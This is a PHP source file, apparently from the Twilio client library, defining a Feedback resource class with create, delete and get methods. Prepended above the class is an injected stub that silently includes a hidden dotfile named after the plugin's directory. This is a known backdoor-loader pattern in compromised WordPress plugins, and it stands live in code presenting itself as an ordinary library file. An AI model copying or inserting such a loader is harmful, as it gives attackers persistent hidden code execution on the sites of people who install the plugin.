<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_Feedback extends Services_Twilio_InstanceResource {

    public function __construct($client, $uri, $params = array()) {
        $this->instance_name = "Services_Twilio_Rest_Feedback";
        return parent::__construct($client, $uri, $params);
    }

    /**
     * Create feedback for the parent call
     */
    public function create(array $params = array()) {
        $params = $this->client->createData($this->uri, $params);
        return new $this->instance_name($this->client, $this->uri, $params);
    }

    /**
     * Delete feedback for the parent call
     */
    public function delete() {
        $this->client->deleteData($this->uri);
    }

    /**
     * Fetch the feedback for the parent call
     */
    public function get() {
        return new $this->instance_name(
            $this->client, $this->uri
        );
    }

}
